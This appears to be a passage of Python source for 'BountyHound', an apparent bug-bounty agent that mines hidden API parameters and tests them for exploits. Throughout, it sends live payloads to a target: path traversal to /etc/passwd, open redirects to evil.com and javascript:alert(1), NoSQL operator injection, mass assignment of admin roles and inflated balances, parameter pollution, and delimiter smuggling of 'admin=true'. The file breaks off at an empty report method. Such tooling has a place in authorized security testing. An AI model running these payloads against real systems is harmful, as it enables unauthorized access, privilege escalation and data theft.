"""
API Endpoint Parameter Miner Agent

Advanced API parameter discovery and exploitation engine that identifies hidden
parameters, tests parameter pollution, type confusion, mass assignment, and
parameter smuggling vulnerabilities across REST and GraphQL APIs.

This agent combines multiple discovery techniques:
- Dictionary-based mining with contextual test values
- Reflection-based discovery through error message analysis
- Type confusion testing with automated type variants
- HTTP Parameter Pollution (HPP) detection
- Mass assignment vulnerability testing
- Parameter smuggling via delimiter confusion

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import json
import copy
import time
import urllib.parse
from typing import Dict, List, Tuple, Optional, Set, Any
from dataclasses import dataclass, field, asdict
from datetime import date, datetime
from enum import Enum


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

from engine.core.database import BountyHoundDB
from engine.core.db_hooks import DatabaseHooks


class DiscoveryMethod(Enum):
    """Parameter discovery methods"""
    DICTIONARY = "dictionary_mining"
    REFLECTION = "reflection_mining"
    TYPE_CONFUSION = "type_confusion"
    PARAMETER_POLLUTION = "parameter_pollution"
    MASS_ASSIGNMENT = "mass_assignment"
    PARAMETER_SMUGGLING = "parameter_smuggling"


class VulnerabilityType(Enum):
    """Types of parameter vulnerabilities"""
    HIDDEN_PARAMETER = "hidden_parameter_discovery"
    AUTH_BYPASS = "authentication_bypass"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DEBUG_MODE = "debug_mode_exposure"
    DATA_EXPOSURE = "data_exposure"
    METHOD_OVERRIDE = "http_method_override"
    LOCAL_FILE_INCLUSION = "local_file_inclusion"
    TYPE_CONFUSION = "type_confusion"
    PARAMETER_POLLUTION = "http_parameter_pollution"
    MASS_ASSIGNMENT = "mass_assignment"
    PARAMETER_SMUGGLING = "parameter_smuggling"
    ERROR_MESSAGE_LEAK = "error_message_parameter_leak"


class SeverityLevel(Enum):
    """Severity levels"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class ParameterFinding:
    """Represents a discovered parameter vulnerability"""
    param_name: str
    param_type: str
    discovery_method: DiscoveryMethod
    vulnerability_type: VulnerabilityType
    severity: SeverityLevel
    evidence: Dict[str, Any]
    exploitation_path: str
    impact: str
    endpoint: str = ""
    test_value: Any = None
    baseline_status: int = 0
    test_status: int = 0
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())
    poc: str = ""
    remediation: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = asdict(self)
        data['discovery_method'] = self.discovery_method.value
        data['vulnerability_type'] = self.vulnerability_type.value
        data['severity'] = self.severity.value
        return data


@dataclass
class ParameterTestResult:
    """Result from a parameter test"""
    param_name: str
    test_value: Any
    status_code: int
    response_length: int
    response_time: float
    headers: Dict[str, str]
    is_active: bool
    differences: List[str] = field(default_factory=list)


class ParameterDictionary:
    """Parameter dictionary manager"""

    # Common parameter dictionaries by category
    AUTH_PARAMS = [
        'admin', 'isAdmin', 'is_admin', 'role', 'userRole', 'user_role',
        'privilege', 'permissions', 'access_level', 'accessLevel',
        'authenticated', 'is_authenticated', 'verified', 'isVerified',
        'staff', 'superuser', 'moderator', 'editor', 'owner',
        'admin_mode', 'adminMode', 'user_type', 'userType'
    ]

    DEBUG_PARAMS = [
        'debug', 'debugMode', 'debug_mode', 'verbose', 'trace',
        'test', 'testing', 'dev', 'development', 'internal',
        'showErrors', 'show_errors', 'printStackTrace', 'backtrace',
        'log_level', 'logLevel', 'logging', 'show_debug'
    ]

    DATA_ACCESS_PARAMS = [
        'id', '_id', 'userId', 'user_id', 'accountId', 'account_id',
        'limit', 'offset', 'page', 'per_page', 'perPage',
        'fields', 'include', 'exclude', 'select', 'filter',
        'sort', 'order', 'orderBy', 'order_by', 'groupBy', 'group_by',
        'expand', 'embed', 'relations', 'with'
    ]

    FILTER_PARAMS = [
        'where', 'query', 'search', 'q', 'filter', 'filters',
        'conditions', 'criteria', 'match', 'find', 'like',
        'contains', 'startsWith', 'endsWith', 'regex'
    ]

    FORMAT_PARAMS = [
        'format', 'output', 'responseType', 'response_type',
        'contentType', 'content_type', 'accept', 'encoding',
        'pretty', 'prettyPrint', 'indent'
    ]

    METHOD_OVERRIDE_PARAMS = [
        '_method', 'method', 'X-HTTP-Method', 'X-HTTP-Method-Override',
        '_METHOD', 'METHOD', 'http_method'
    ]

    CALLBACK_PARAMS = [
        'callback', 'jsonp', 'jsonpCallback', 'jsonp_callback',
        'cb', 'call', 'function', 'fn'
    ]

    REDIRECT_PARAMS = [
        'redirect', 'redirect_uri', 'redirectUri', 'return',
        'returnTo', 'return_to', 'next', 'url', 'target',
        'destination', 'continue', 'goto', 'forward'
    ]

    FILE_OPERATION_PARAMS = [
        'file', 'filename', 'path', 'filepath', 'dir', 'directory',
        'template', 'view', 'page', 'include', 'require',
        'src', 'source', 'load'
    ]

    MASS_ASSIGNMENT_PARAMS = [
        'attributes', 'properties', 'data', 'model', 'object',
        'update', 'set', 'merge', 'assign', 'bind'
    ]

    @classmethod
    def get_all_categories(cls) -> Dict[str, List[str]]:
        """Get all parameter categories"""
        return {
            'auth': cls.AUTH_PARAMS,
            'debug': cls.DEBUG_PARAMS,
            'data_access': cls.DATA_ACCESS_PARAMS,
            'filters': cls.FILTER_PARAMS,
            'format': cls.FORMAT_PARAMS,
            'method_override': cls.METHOD_OVERRIDE_PARAMS,
            'callback': cls.CALLBACK_PARAMS,
            'redirect': cls.REDIRECT_PARAMS,
            'file_operations': cls.FILE_OPERATION_PARAMS,
            'mass_assignment': cls.MASS_ASSIGNMENT_PARAMS
        }

    @classmethod
    def generate_test_values(cls, param: str, category: str) -> List[Any]:
        """Generate contextual test values for a parameter"""
        values = []

        if category == 'auth':
            values = [
                'true', '1', 'yes', 'admin', 'administrator',
                True, 1, ['admin'], {'role': 'admin'}
            ]
        elif category == 'debug':
            values = ['true', '1', 'yes', True, 1]
        elif category == 'data_access':
            values = ['1', '0', '-1', '999999', ['1', '2'], {'$ne': None}]
        elif category == 'method_override':
            values = ['PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
        elif category == 'callback':
            values = ['test', 'alert', 'eval', 'jsonp123', 'function']
        elif category == 'redirect':
            values = [
                'https://evil.com',
                '//evil.com',
                '/admin',
                'javascript:alert(1)'
            ]
        elif category == 'file_operations':
            values = [
                '/etc/passwd',
                '../../etc/passwd',
                'C:\\windows\\win.ini',
                'admin.php',
                'config.php'
            ]
        else:
            values = ['true', '1', 'test']

        return values


class ResponseAnalyzer:
    """Analyze HTTP responses for parameter activity"""

    @staticmethod
    def is_parameter_active(test_resp: Dict, baseline: Dict) -> bool:
        """Determine if parameter caused a meaningful change"""
        if not baseline or not test_resp:
            return False

        # Status code change
        if test_resp.get('status_code') != baseline.get('status_code'):
            return True

        # Response length change (significant)
        test_len = test_resp.get('response_length', 0)
        baseline_len = baseline.get('response_length', 0)
        if abs(test_len - baseline_len) > 50:
            return True

        # Response time significant difference (>2x)
        test_time = test_resp.get('response_time', 0)
        baseline_time = baseline.get('response_time', 0)
        if baseline_time > 0 and test_time > baseline_time * 2:
            return True

        # New headers appeared
        baseline_headers = set(baseline.get('headers', {}).keys())
        test_headers = set(test_resp.get('headers', {}).keys())
        if test_headers - baseline_headers:
            return True

        # Content-Type change
        baseline_ct = baseline.get('headers', {}).get('Content-Type', '')
        test_ct = test_resp.get('headers', {}).get('Content-Type', '')
        if baseline_ct != test_ct:
            return True

        # JSON structure change
        try:
            test_json = json.loads(test_resp.get('body', ''))
            baseline_json = json.loads(baseline.get('body', ''))
            if set(test_json.keys()) != set(baseline_json.keys()):
                return True
        except:
            pass

        return False

    @staticmethod
    def analyze_impact(param: str, value: Any, test_resp: Dict,
                      baseline: Dict, category: str) -> Tuple[VulnerabilityType, SeverityLevel, str]:
        """Analyze the security impact of discovered parameter"""

        vuln_type = VulnerabilityType.HIDDEN_PARAMETER
        severity = SeverityLevel.MEDIUM
        impact = "Undocumented parameter exposes additional functionality"

        test_status = test_resp.get('status_code', 0)
        baseline_status = baseline.get('status_code', 0)
        test_body = test_resp.get('body', '').lower()
        baseline_body = baseline.get('body', '').lower()

        # Enhanced analysis based on category
        if category == 'auth':
            if test_status == 200 and baseline_status in [401, 403]:
                vuln_type = VulnerabilityType.AUTH_BYPASS
                severity = SeverityLevel.CRITICAL
                impact = "Parameter bypasses authentication/authorization"
            elif 'admin' in test_body and 'admin' not in baseline_body:
                vuln_type = VulnerabilityType.PRIVILEGE_ESCALATION
                severity = SeverityLevel.HIGH
                impact = "Parameter grants administrative access"

        elif category == 'debug':
            debug_indicators = ['stack trace', 'exception', 'error at line', 'traceback']
            if any(leak in test_body for leak in debug_indicators):
                vuln_type = VulnerabilityType.DEBUG_MODE
                severity = SeverityLevel.MEDIUM
                impact = "Debug mode leaks internal paths, errors, stack traces"

        elif category == 'data_access':
            test_len = test_resp.get('response_length', 0)
            baseline_len = baseline.get('response_length', 0)
            if test_len > baseline_len * 1.5:
                vuln_type = VulnerabilityType.DATA_EXPOSURE
                severity = SeverityLevel.HIGH
                impact = "Parameter exposes additional sensitive data"

        elif category == 'method_override':
            if test_status != baseline_status:
                vuln_type = VulnerabilityType.METHOD_OVERRIDE
                severity = SeverityLevel.HIGH
                impact = "Parameter allows HTTP method override, may bypass restrictions"

        elif category == 'file_operations':
            lfi_indicators = ['root:', '[boot loader]', '<?php', '/bin/', 'www-data']
            if any(indicator in test_body for indicator in lfi_indicators):
                vuln_type = VulnerabilityType.LOCAL_FILE_INCLUSION
                severity = SeverityLevel.CRITICAL
                impact = "Parameter allows arbitrary file reading"

        return vuln_type, severity, impact

    @staticmethod
    def extract_params_from_errors(response_text: str) -> List[str]:
        """Extract parameter names from error messages"""
        params = set()

        # Common error patterns
        patterns = [
            r"parameter['\"]?\s*[:\[]\s*['\"]?(\w+)",
            r"missing\s+(?:required\s+)?(?:parameter|field)['\"]?\s*[:\[]\s*['\"]?(\w+)",
            r"unknown\s+(?:parameter|field)['\"]?\s*[:\[]\s*['\"]?(\w+)",
            r"invalid\s+(?:parameter|field)['\"]?\s*[:\[]\s*['\"]?(\w+)",
            r"'(\w+)'\s+(?:is\s+)?(?:required|missing)",
            r'"(\w+)"\s+(?:is\s+)?(?:required|missing)',
            r'{\s*"(\w+)"\s*:',  # JSON keys
            r'\[(\w+)\]',  # Array notation
        ]

        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            params.update(matches)

        # Filter out common false positives
        false_positives = {'error', 'message', 'status', 'code', 'type', 'detail'}
        params = {p for p in params if p.lower() not in false_positives}

        return list(params)


class TypeConfusionTester:
    """Test type confusion vulnerabilities"""

    @staticmethod
    def generate_type_variants(param: str, value: Any) -> Dict[str, Any]:
        """Generate type-confused variants of a value"""
        variants = {}

        if isinstance(value, str):
            variants['int'] = 1
            variants['bool'] = True
            variants['list'] = [value]
            variants['dict'] = {param: value}
            variants['null'] = None
        elif isinstance(value, int):
            variants['str'] = str(value)
            variants['bool'] = bool(value)
            variants['list'] = [value]
            variants['dict'] = {param: value}
            variants['float'] = float(value)
        elif isinstance(value, bool):
            variants['str'] = str(value).lower()
            variants['int'] = 1 if value else 0
            variants['list'] = [value]
        elif isinstance(value, list):
            variants['str'] = ','.join(map(str, value))
            variants['dict'] = {str(i): v for i, v in enumerate(value)}
        elif isinstance(value, dict):
            variants['str'] = json.dumps(value)
            variants['list'] = list(value.values())

        return variants

    @staticmethod
    def detect_impact(test_resp: Dict, baseline: Dict) -> bool:
        """Detect if type confusion had security impact"""
        test_status = test_resp.get('status_code', 0)
        baseline_status = baseline.get('status_code', 0)

        # Status code bypass (403/401 → 200)
        if baseline_status in [401, 403] and test_status == 200:
            return True

        # Significant response difference
        test_len = test_resp.get('response_length', 0)
        baseline_len = baseline.get('response_length', 0)
        if abs(test_len - baseline_len) > 100:
            return True

        # SQL/NoSQL error indicators
        test_body = test_resp.get('body', '').lower()
        sql_errors = ['sql syntax', 'mysql', 'postgresql', 'sqlite', 'ora-', 'mongodb']
        if any(err in test_body for err in sql_errors):
            return True

        # Unexpected data type in response
        try:
            test_json = json.loads(test_resp.get('body', ''))
            baseline_json = json.loads(baseline.get('body', ''))

            # Check for new fields or different structure
            if set(test_json.keys()) != set(baseline_json.keys()):
                return True
        except:
            pass

        return False


class APIParameterMiner:
    """
    Advanced API parameter discovery and exploitation engine.
    Combines multiple techniques for comprehensive parameter mining.
    """

    def __init__(self, base_url: str, target_domain: str = None,
                 session: requests.Session = None, timeout: int = 10,
                 verify_ssl: bool = True):
        """
        Initialize the API Parameter Miner.

        Args:
            base_url: Base URL for the API
            target_domain: Target domain for database tracking
            session: Optional requests session
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library is required. Install with: pip install requests")

        self.base_url = base_url.rstrip('/')
        self.target_domain = target_domain or self._extract_domain(base_url)
        self.session = session or requests.Session()
        self.timeout = timeout
        self.verify_ssl = verify_ssl

        self.session.headers.update({
            'User-Agent': 'BountyHound/3.0'
        })

        # Common parameter dictionaries
        self.param_categories = ParameterDictionary.get_all_categories()
        self.findings: List[ParameterFinding] = []
        self.test_results: List[ParameterTestResult] = []

        # Database integration
        self.db = BountyHoundDB()

    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL"""
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc or parsed.path.split('/')[0]

    def mine_parameters(self, endpoint: str, method: str = 'GET',
                       auth_headers: Dict = None, body: Dict = None,
                       skip_db_check: bool = False) -> List[ParameterFinding]:
        """
        Comprehensive parameter mining on an endpoint.

        Args:
            endpoint: API endpoint path
            method: HTTP method
            auth_headers: Authorization headers
            body: Request body for POST/PUT
            skip_db_check: Skip database check (for testing)

        Returns:
            List of parameter findings
        """
        # Check database first
        if not skip_db_check:
            context = DatabaseHooks.before_test(self.target_domain, 'api_parameter_miner')
            if context['should_skip']:
                print(f"⚠️  {context['reason']}")
                print(f"Previous findings: {len(context['previous_findings'])}")

        print(f"[*] Mining parameters for {method} {endpoint}")

        # Get baseline response
        baseline = self._get_baseline(endpoint, method, auth_headers, body)

        if not baseline:
            print("[!] Failed to get baseline response")
            return self.findings

        # Discovery techniques
        self._dictionary_mining(endpoint, method, baseline, auth_headers, body)
        self._reflection_mining(endpoint, method, baseline, auth_headers, body)

        if body and method.upper() != 'GET':
            self._type_confusion_testing(endpoint, method, baseline, auth_headers, body)
            self._mass_assignment_testing(endpoint, method, baseline, auth_headers, body)

        if method.upper() == 'GET':
            self._parameter_pollution_testing(endpoint, method, baseline, auth_headers, body)

        self._parameter_smuggling_testing(endpoint, method, baseline, auth_headers, body)

        # Record findings in database
        if not skip_db_check:
            self._record_findings()

        return self.findings

    def _get_baseline(self, endpoint: str, method: str,
                     auth_headers: Dict, body: Dict) -> Optional[Dict]:
        """Get baseline response for comparison"""
        url = f"{self.base_url}{endpoint}"
        headers = auth_headers or {}
        headers.update(self.session.headers)

        try:
            start_time = time.time()

            if method.upper() == 'GET':
                resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                       verify=self.verify_ssl, allow_redirects=False)
            elif method.upper() == 'POST':
                resp = self.session.post(url, json=body, headers=headers,
                                        timeout=self.timeout, verify=self.verify_ssl,
                                        allow_redirects=False)
            elif method.upper() == 'PUT':
                resp = self.session.put(url, json=body, headers=headers,
                                       timeout=self.timeout, verify=self.verify_ssl,
                                       allow_redirects=False)
            elif method.upper() == 'DELETE':
                resp = self.session.delete(url, headers=headers, timeout=self.timeout,
                                          verify=self.verify_ssl, allow_redirects=False)
            else:
                resp = self.session.request(method, url, headers=headers,
                                           timeout=self.timeout, verify=self.verify_ssl,
                                           allow_redirects=False)

            elapsed = time.time() - start_time

            return {
                'url': url,
                'method': method,
                'status_code': resp.status_code,
                'headers': dict(resp.headers),
                'body': resp.text,
                'response_length': len(resp.text),
                'response_time': elapsed
            }
        except Exception as e:
            print(f"[!] Baseline request failed: {e}")
            return None

    def _make_test_request(self, endpoint: str, method: str, param: str,
                          value: Any, auth_headers: Dict, body: Dict,
                          is_query: bool = True) -> Optional[Dict]:
        """Make a test request with parameter"""
        url = f"{self.base_url}{endpoint}"
        headers = auth_headers or {}
        headers.update(self.session.headers)

        try:
            start_time = time.time()

            if is_query:
                # Add as query parameter
                separator = '&' if '?' in url else '?'
                test_url = f"{url}{separator}{param}={urllib.parse.quote(str(value))}"

                if method.upper() == 'GET':
                    resp = self.session.get(test_url, headers=headers, timeout=self.timeout,
                                           verify=self.verify_ssl, allow_redirects=False)
                else:
                    resp = self.session.post(test_url, json=body, headers=headers,
                                            timeout=self.timeout, verify=self.verify_ssl,
                                            allow_redirects=False)
            else:
                # Add to body
                test_body = (body or {}).copy()
                test_body[param] = value
                resp = self.session.post(url, json=test_body, headers=headers,
                                        timeout=self.timeout, verify=self.verify_ssl,
                                        allow_redirects=False)

            elapsed = time.time() - start_time

            return {
                'url': url,
                'method': method,
                'status_code': resp.status_code,
                'headers': dict(resp.headers),
                'body': resp.text,
                'response_length': len(resp.text),
                'response_time': elapsed
            }
        except Exception as e:
            return None

    def _dictionary_mining(self, endpoint: str, method: str, baseline: Dict,
                          auth_headers: Dict, body: Dict) -> None:
        """Dictionary-based parameter discovery"""
        print(f"[*] Running dictionary mining...")

        for category, params in self.param_categories.items():
            for param in params:
                # Generate test values
                test_values = ParameterDictionary.generate_test_values(param, category)

                for value in test_values:
                    # Test as query parameter
                    test_resp = self._make_test_request(
                        endpoint, method, param, value, auth_headers, body, is_query=True
                    )

                    if test_resp and ResponseAnalyzer.is_parameter_active(test_resp, baseline):
                        finding = self._create_finding(
                            param, value, test_resp, baseline, category,
                            DiscoveryMethod.DICTIONARY, endpoint
                        )
                        if finding:
                            self.findings.append(finding)
                            print(f"[+] Found active parameter: {param}={value}")
                            break

                    time.sleep(0.05)  # Rate limiting

    def _reflection_mining(self, endpoint: str, method: str,
                          baseline: Dict, auth_headers: Dict, body: Dict) -> None:
        """Discover parameters through error message analysis"""
        print(f"[*] Running reflection-based mining...")

        url = f"{self.base_url}{endpoint}"
        headers = auth_headers or {}
        headers.update(self.session.headers)

        # Send requests with invalid/missing required parameters
        test_cases = [
            {},  # Empty params
            {'INVALID_PARAM_12345': 'test'},  # Random param
        ]

        for test_params in test_cases:
            try:
                if method.upper() == 'GET':
                    resp = self.session.get(url, params=test_params, headers=headers,
                                           timeout=self.timeout, verify=self.verify_ssl)
                else:
                    resp = self.session.post(url, json=test_params, headers=headers,
                                            timeout=self.timeout, verify=self.verify_ssl)

                # Extract parameter names from error messages
                discovered = ResponseAnalyzer.extract_params_from_errors(resp.text)

                if discovered:
                    print(f"[+] Reflected parameters found: {discovered}")

                    # Test each discovered parameter
                    for param in discovered:
                        self._test_reflected_parameter(
                            endpoint, method, param, baseline, auth_headers, body
                        )

            except Exception as e:
                continue

    def _test_reflected_parameter(self, endpoint: str, method: str,
                                  param: str, baseline: Dict,
                                  auth_headers: Dict, body: Dict) -> None:
        """Test a parameter discovered via reflection"""
        test_values = ['true', '1', 'test', ['test'], {'key': 'value'}]

        for value in test_values:
            test_resp = self._make_test_request(
                endpoint, method, param, value, auth_headers, body,
                is_query=(method.upper() == 'GET')
            )

            if test_resp and ResponseAnalyzer.is_parameter_active(test_resp, baseline):
                finding = ParameterFinding(
                    param_name=param,
                    param_type=type(value).__name__,
                    discovery_method=DiscoveryMethod.REFLECTION,
                    vulnerability_type=VulnerabilityType.ERROR_MESSAGE_LEAK,
                    severity=SeverityLevel.MEDIUM,
                    evidence={
                        'parameter': param,
                        'discovery_source': 'error_message',
                        'test_value': str(value),
                        'status_code': test_resp['status_code']
                    },
                    exploitation_path=f"Parameter {param} discovered via error message analysis",
                    impact="Error messages leak valid parameter names",
                    endpoint=endpoint,
                    test_value=value,
                    test_status=test_resp['status_code']
                )
                self.findings.append(finding)
                print(f"[+] Confirmed reflected parameter: {param}")
                break

    def _type_confusion_testing(self, endpoint: str, method: str,
                               baseline: Dict, auth_headers: Dict, body: Dict) -> None:
        """Test type confusion vulnerabilities"""
        print(f"[*] Running type confusion tests...")

        for param, original_value in body.items():
            original_type = type(original_value).__name__

            # Generate type-confused variants
            variants = TypeConfusionTester.generate_type_variants(param, original_value)

            for variant_type, variant_value in variants.items():
                if variant_type == original_type:
                    continue

                test_body = body.copy()
                test_body[param] = variant_value

                test_resp = self._make_test_request(
                    endpoint, method, param, variant_value, auth_headers, body, is_query=False
                )

                # Check for type confusion impact
                if test_resp and TypeConfusionTester.detect_impact(test_resp, baseline):
                    finding = ParameterFinding(
                        param_name=param,
                        param_type=f"{original_type} → {variant_type}",
                        discovery_method=DiscoveryMethod.TYPE_CONFUSION,
                        vulnerability_type=VulnerabilityType.TYPE_CONFUSION,
                        severity=SeverityLevel.HIGH,
                        evidence={
                            'parameter': param,
                            'original_type': original_type,
                            'original_value': original_value,
                            'confused_type': variant_type,
                            'confused_value': variant_value,
                            'status_code': test_resp['status_code'],
                            'response_snippet': test_resp['body'][:500]
                        },
                        exploitation_path=f"1. Original: {param}={original_value} ({original_type})\n"
                                        f"2. Confused: {param}={variant_value} ({variant_type})\n"
                                        f"3. Observe validation bypass or unexpected behavior",
                        impact="Type confusion bypasses input validation",
                        endpoint=endpoint,
                        test_value=variant_value,
                        test_status=test_resp['status_code']
                    )
                    self.findings.append(finding)
                    print(f"[+] Type confusion: {param} {original_type}→{variant_type}")

    def _parameter_pollution_testing(self, endpoint: str, method: str,
                                    baseline: Dict, auth_headers: Dict, body: Dict) -> None:
        """Test HTTP Parameter Pollution vulnerabilities"""
        print(f"[*] Running parameter pollution tests...")

        # Common parameters to test for HPP
        test_params = ['id', 'user', 'userId', 'email', 'amount', 'price', 'role']

        for param in test_params:
            # Test duplicate parameters with conflicting values
            hpp_queries = [
                f"{param}=safe&{param}=malicious",
                f"{param}=1&{param}=2&{param}=3",
                f"{param}=user&{param}=admin",
                f"{param}=0.01&{param}=999.99",
            ]

            for hpp_query in hpp_queries:
                try:
                    url = f"{self.base_url}{endpoint}?{hpp_query}"
                    headers = auth_headers or {}
                    headers.update(self.session.headers)

                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           verify=self.verify_ssl, allow_redirects=False)

                    test_resp = {
                        'url': url,
                        'status_code': resp.status_code,
                        'body': resp.text,
                        'response_length': len(resp.text),
                        'headers': dict(resp.headers)
                    }

                    # Check for HPP impact
                    if self._detect_hpp_impact(test_resp, baseline, param):
                        finding = ParameterFinding(
                            param_name=param,
                            param_type="HTTP Parameter Pollution",
                            discovery_method=DiscoveryMethod.PARAMETER_POLLUTION,
                            vulnerability_type=VulnerabilityType.PARAMETER_POLLUTION,
                            severity=SeverityLevel.HIGH,
                            evidence={
                                'parameter': param,
                                'pollution_query': hpp_query,
                                'status_code': resp.status_code,
                                'response_snippet': resp.text[:500]
                            },
                            exploitation_path=f"1. Send duplicate parameters: {hpp_query}\n"
                                            f"2. WAF reads first value, backend reads last (or vice versa)\n"
                                            f"3. Exploit parsing inconsistency for bypass",
                            impact="HPP bypasses WAF, enables injection attacks",
                            endpoint=endpoint,
                            test_value=hpp_query,
                            test_status=resp.status_code
                        )
                        self.findings.append(finding)
                        print(f"[+] HPP vulnerability: {param}")
                        break

                except Exception as e:
                    continue

    def _detect_hpp_impact(self, test_resp: Dict, baseline: Dict, param: str) -> bool:
        """Detect HTTP Parameter Pollution impact"""
        # Different status code
        if test_resp.get('status_code') != baseline.get('status_code'):
            return True

        # Response indicates multiple values were processed
        test_body = test_resp.get('body', '').lower()
        hpp_indicators = [
            'array', 'multiple values', 'duplicate', f"{param}[",
            'first', 'last', 'index'
        ]
        if any(ind in test_body for ind in hpp_indicators):
            return True

        # Significant response difference
        test_len = test_resp.get('response_length', 0)
        baseline_len = baseline.get('response_length', 0)
        if abs(test_len - baseline_len) > 50:
            return True

        return False

    def _mass_assignment_testing(self, endpoint: str, method: str,
                                baseline: Dict, auth_headers: Dict, body: Dict) -> None:
        """Test mass assignment vulnerabilities"""
        print(f"[*] Running mass assignment tests...")

        # Dangerous properties to inject
        mass_assignment_props = {
            'role': 'admin',
            'isAdmin': True,
            'is_admin': True,
            'admin': True,
            'verified': True,
            'balance': 999999,
            'price': 0.01,
        }

        for prop, value in mass_assignment_props.items():
            test_body = body.copy()
            test_body[prop] = value

            test_resp = self._make_test_request(
                endpoint, method, prop, value, auth_headers, body, is_query=False
            )

            # Check if property was bound
            if test_resp and self._detect_mass_assignment_impact(test_resp, baseline, prop, value):
                severity = SeverityLevel.CRITICAL if prop in ['role', 'isAdmin', 'balance'] else SeverityLevel.HIGH

                finding = ParameterFinding(
                    param_name=prop,
                    param_type=type(value).__name__,
                    discovery_method=DiscoveryMethod.MASS_ASSIGNMENT,
                    vulnerability_type=VulnerabilityType.MASS_ASSIGNMENT,
                    severity=severity,
                    evidence={
                        'injected_property': prop,
                        'injected_value': value,
                        'status_code': test_resp['status_code'],
                        'response_snippet': test_resp['body'][:500]
                    },
                    exploitation_path=f"1. Inject property in request body: {prop}={value}\n"
                                    f"2. Backend binds property to internal object\n"
                                    f"3. Achieve privilege escalation or data manipulation",
                    impact=f"Mass assignment allows injecting {prop} property",
                    endpoint=endpoint,
                    test_value=value,
                    test_status=test_resp['status_code']
                )
                self.findings.append(finding)
                print(f"[+] Mass assignment: {prop}={value}")

    def _detect_mass_assignment_impact(self, test_resp: Dict, baseline: Dict,
                                      prop: str, value: Any) -> bool:
        """Detect mass assignment impact"""
        test_body = test_resp.get('body', '')
        baseline_body = baseline.get('body', '')

        # Property appears in response
        if str(value) in test_body and str(value) not in baseline_body:
            return True

        # Property name appears in response
        if prop in test_body and prop not in baseline_body:
            return True

        # Status code change indicates property was processed
        if test_resp.get('status_code') != baseline.get('status_code'):
            return True

        # Try parsing JSON response
        try:
            test_json = json.loads(test_body)
            # Check if injected property is in response
            if prop in test_json or str(value) in json.dumps(test_json):
                return True
        except:
            pass

        return False

    def _parameter_smuggling_testing(self, endpoint: str, method: str,
                                    baseline: Dict, auth_headers: Dict, body: Dict) -> None:
        """Test parameter smuggling via delimiter confusion"""
        print(f"[*] Running parameter smuggling tests...")

        # Smuggling techniques
        smuggling_cases = [
            ('id', '1%26admin=true'),  # URL-encoded ampersand
            ('id', '1;admin=true'),    # Semicolon delimiter
            ('id', '1%00admin=true'),  # Null byte
            ('id', '1#admin=true'),    # Fragment
            ('id', '1%0aadmin=true'),  # Newline
        ]

        for param, smuggled_value in smuggling_cases:
            test_resp = self._make_test_request(
                endpoint, method, param, smuggled_value, auth_headers, body,
                is_query=(method.upper() == 'GET')
            )

            # Check for smuggling impact
            if test_resp and self._detect_smuggling_impact(test_resp, baseline):
                finding = ParameterFinding(
                    param_name=param,
                    param_type="Parameter Smuggling",
                    discovery_method=DiscoveryMethod.PARAMETER_SMUGGLING,
                    vulnerability_type=VulnerabilityType.PARAMETER_SMUGGLING,
                    severity=SeverityLevel.HIGH,
                    evidence={
                        'parameter': param,
                        'smuggled_value': smuggled_value,
                        'status_code': test_resp['status_code'],
                        'response_snippet': test_resp['body'][:500]
                    },
                    exploitation_path=f"1. Smuggle parameter: {param}={smuggled_value}\n"
                                    f"2. Delimiter confusion causes parser inconsistency\n"
                                    f"3. Inject additional parameters via encoding tricks",
                    impact="Parameter smuggling bypasses input filters",
                    endpoint=endpoint,
                    test_value=smuggled_value,
                    test_status=test_resp['status_code']
                )
                self.findings.append(finding)
                print(f"[+] Smuggling: {param}={smuggled_value}")

    def _detect_smuggling_impact(self, test_resp: Dict, baseline: Dict) -> bool:
        """Detect parameter smuggling impact"""
        # Status change
        if test_resp.get('status_code') != baseline.get('status_code'):
            return True

        # Smuggling indicators
        test_body = test_resp.get('body', '').lower()
        if any(ind in test_body for ind in ['admin', 'smuggled', 'injected']):
            return True

        # Response structure change
        test_len = test_resp.get('response_length', 0)
        baseline_len = baseline.get('response_length', 0)
        if abs(test_len - baseline_len) > 100:
            return True

        return False

    def _create_finding(self, param: str, value: Any, test_resp: Dict,
                       baseline: Dict, category: str, method: DiscoveryMethod,
                       endpoint: str) -> Optional[ParameterFinding]:
        """Create a parameter finding"""
        vuln_type, severity, impact = ResponseAnalyzer.analyze_impact(
            param, value, test_resp, baseline, category
        )

        evidence = {
            'parameter': param,
            'test_value': str(value),
            'baseline_status': baseline['status_code'],
            'test_status': test_resp['status_code'],
            'baseline_length': baseline['response_length'],
            'test_length': test_resp['response_length'],
            'response_snippet': test_resp['body'][:500]
        }

        exploitation_path = f"""1. Add parameter to request: {param}={value}
2. Observe response changes
3. Exploit based on functionality exposed"""

        return ParameterFinding(
            param_name=param,
            param_type=type(value).__name__,
            discovery_method=method,
            vulnerability_type=vuln_type,
            severity=severity,
            evidence=evidence,
            exploitation_path=exploitation_path,
            impact=impact,
            endpoint=endpoint,
            test_value=value,
            baseline_status=baseline['status_code'],
            test_status=test_resp['status_code']
        )

    def _record_findings(self):
        """Record findings in database"""
        try:
            target_id = self.db.get_or_create_target(
                domain=self.target_domain,
                platform="unknown"
            )

            for finding in self.findings:
                self.db.add_finding(
                    target_id=target_id,
                    title=f"{finding.vulnerability_type.value} via {finding.param_name}",
                    severity=finding.severity.value,
                    vuln_type=finding.vulnerability_type.value,
                    description=finding.impact,
                    poc=finding.exploitation_path,
                    endpoints=[finding.endpoint]
                )
        except Exception as e:
            print(f"Error recording findings in database: {e}")

    def generate_report(self) -> Dict[str, Any]:
